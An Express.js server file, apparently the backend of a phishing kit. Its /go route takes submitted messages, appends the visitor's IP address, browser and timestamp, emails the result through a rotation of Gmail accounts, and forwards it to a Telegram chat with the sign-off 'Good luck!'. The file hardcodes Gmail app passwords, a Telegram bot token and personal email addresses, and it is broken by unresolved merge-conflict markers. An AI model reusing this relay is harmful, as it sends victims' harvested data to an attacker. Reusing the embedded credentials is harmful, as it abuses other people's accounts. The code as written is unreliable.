const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api"); // Import Telegram Bot library
const axios = require("axios");

const app = express();

const port = 3001;

// Middleware to parse JSON requests
app.use(cors());
app.use(bodyParser.json());

// List of Gmail accounts and their respective app passwords
const gmailAccounts = [
  { user: "serenetides01@gmail.com", pass: "fgta ophs ewdn gfum" },
  { user: "serenetides37@gmail.com", pass: "rmmh cqms dcub denw" },  // Replace with your actual app passwords
  { user: "serenetides02@gmail.com", pass: "fqye cfrz nvsg aluc" },
  { user: "shopperoutreach@gmail.com", pass: "atiu vczo bdgl lwou" },
  { user: "richard.weeks1945@gmail.com", pass: "ukrt wbph qizo ticu" }
];

// Telegram Bot setup
const telegramToken = "7637425229:AAEOd39Gvu7O77XXk_pm5FLDTOPcbxqAP3c"; // Replace with your bot token from BotFather
const telegramBot = new TelegramBot(telegramToken, { polling: true });

// Your Telegram chat ID
const chatId = "5640521477"; // Replace with your chat ID

// Webhook URL
const webhookUrl = "https://api-gamma-neon.vercel.app/telegram-webhook"; // Replace with your actual webhook URL

// Set webhook with Telegram
const setWebhook = async () => {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${telegramToken}/setWebhook`,
      {
        url: webhookUrl,
      }
    );
    console.log("Webhook set successfully:", response.data);
  } catch (error) {
    console.error("Error setting webhook:", error.message);
  }
};

// Call the function to set the webhook
setWebhook();

app.get("/", (req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Welcome to my simple API");
});

// Rotate email accounts function
<<<<<<< HEAD
const sendEmailWithRotation = (req, subject, message, callback) => {
=======
const sendEmailWithRotation = (subject, message, callback) => {
>>>>>>> f64767081ef021460dadc4337243f127222f46cd
  let attempt = 0;

  const tryNextAccount = () => {
    if (attempt >= gmailAccounts.length) {
<<<<<<< HEAD
      console.log("All Gmail accounts have been tried, email sending failed.");
=======
>>>>>>> f64767081ef021460dadc4337243f127222f46cd
      return callback("failed all", null);
    }

    const { user, pass } = gmailAccounts[attempt];
<<<<<<< HEAD
    console.log(`Attempting to send email with: ${user}`); // Diagnostic point

=======
>>>>>>> f64767081ef021460dadc4337243f127222f46cd
    const transporter = nodemailer.createTransport({
      service: "gmail", 
      auth: {
        user,
        pass,
      },
    });

    // Collect additional information (IP address, browser, timestamp)
    const ipAddress = req.ip; // IP address of the user
    const userAgent = req.headers["user-agent"]; // Browser info
    const timestamp = new Date().toISOString(); // Current timestamp in ISO format

    // Prepare the message to include these details
    const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;

    // Define email options
    const mailOptions = {
      from: user, // Sender email
      to: "hey.heatherw@outlook.com", // Recipient email
      subject: subject, // Subject of the email
      text: fullMessage, // Email body
    };

    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
<<<<<<< HEAD
        console.log(`Failed to send email with ${user}:`, error); // Diagnostic point
        attempt++; // Try the next account
        tryNextAccount();
      } else {
        console.log(`Email successfully sent using ${user}.`); // Diagnostic point

=======
        console.log(`Failed to send email with ${user}:`, error);
        attempt++; // Try the next account
        tryNextAccount();
      } else {
>>>>>>> f64767081ef021460dadc4337243f127222f46cd
        // Send the same message to Telegram using Markdown formatting
        telegramBot
          .sendMessage(
            chatId,
            `*Subject:* ${subject}\n\n${fullMessage}`,
            { parse_mode: "Markdown" } // Enable Markdown mode
          )
          .then(() => {
            callback(null, { message: "ET messages 200", info });
          })
          .catch((telegramError) => {
<<<<<<< HEAD
            console.log("Failed to send Telegram message:", telegramError.message); // Diagnostic point
=======
>>>>>>> f64767081ef021460dadc4337243f127222f46cd
            callback("Failed to send Telegram message", telegramError.message);
          });
      }
    });
  };

  // Start trying to send the email with the first account
  tryNextAccount();
};

// Email and Telegram notification route
app.post("/go", (req, res) => {
  const { subject, message } = req.body;

  // Validate request body
  if (!subject || !message) {
    console.log("Request validation failed. Missing subject or message."); // Diagnostic point
    return res.status(400).json({ error: "All fields are required" });
  }

<<<<<<< HEAD
  console.log("Received request to send email and Telegram notification."); // Diagnostic point

  sendEmailWithRotation(req, subject, message, (error, result) => {
    if (error) {
      console.log("Error occurred while sending email:", error); // Diagnostic point
      return res.status(500).json({ error });
    }

    console.log("Email and Telegram message sent successfully."); // Diagnostic point
=======
  sendEmailWithRotation(subject, message, (error, result) => {
    if (error) {
      return res.status(500).json({ error });
    }

>>>>>>> f64767081ef021460dadc4337243f127222f46cd
    res.status(200).json(result);
  });
});

// Webhook endpoint to handle Telegram updates
app.post("/telegram-webhook", (req, res) => {
  const message = req.body;

  if (message && message.message) {
    const chatId = message.message.chat.id;
    const text = message.message.text;

    // Process the incoming message
    console.log("Received message from Telegram:", text); // Diagnostic point

    // Send a response back to the user
    telegramBot.sendMessage(chatId, `You said: ${text}`);
  }

  // Respond with a 200 OK status to acknowledge the receipt
  res.status(200).send("OK");
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
